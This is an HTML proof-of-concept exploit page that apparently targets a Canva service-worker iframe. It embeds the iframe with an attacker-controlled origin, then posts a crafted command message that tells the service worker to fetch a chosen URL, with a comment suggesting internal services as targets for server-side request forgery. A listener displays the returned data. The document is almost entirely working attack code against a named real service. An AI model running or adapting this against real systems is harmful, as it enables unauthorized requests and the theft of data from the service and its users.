<!DOCTYPE html>
<html>
<head>
  <title>postMessage Hijack PoC</title>
</head>
<body>
  <h2>Canva Service Worker postMessage Hijack PoC</h2>

  <!-- Embed vulnerable Canva iframe with attacker-controlled origin -->
  <iframe id="targetFrame"
    src="https://ct.canva.com/_/service_worker/5510/sw_iframe.html?origin=https://heroic-pastelito-45712a.netlify.app"
    style="width:100%; height:300px; border:1px solid black;"></iframe>

  <script>
    // Wait for iframe and SW to be ready
    setTimeout(() => {
      const iframe = document.getElementById("targetFrame");

      // Proper message format based on sw.js structure (type 1 = command)
      const message = {
        clientId: "evil123",
        type: 1,
        command: {
          commandType: 0, // type 0 = fetch
          params: {
            url: "https://example.com", // Try internal service if SSRF is possible
            method: 0,                  // GET
            processResponse: true
          }
        }
      };

      // Send message to iframe's contentWindow
      iframe.contentWindow.postMessage(message, "https://ct.canva.com");
    }, 3000);

    // Listen for response from iframe
    window.addEventListener("message", (event) => {
      if (event.origin === "https://ct.canva.com") {
        console.log("Received data:", event.data);
        alert("Received message:\n" + JSON.stringify(event.data, null, 2));
      }
    });
  </script>
</body>
</html>
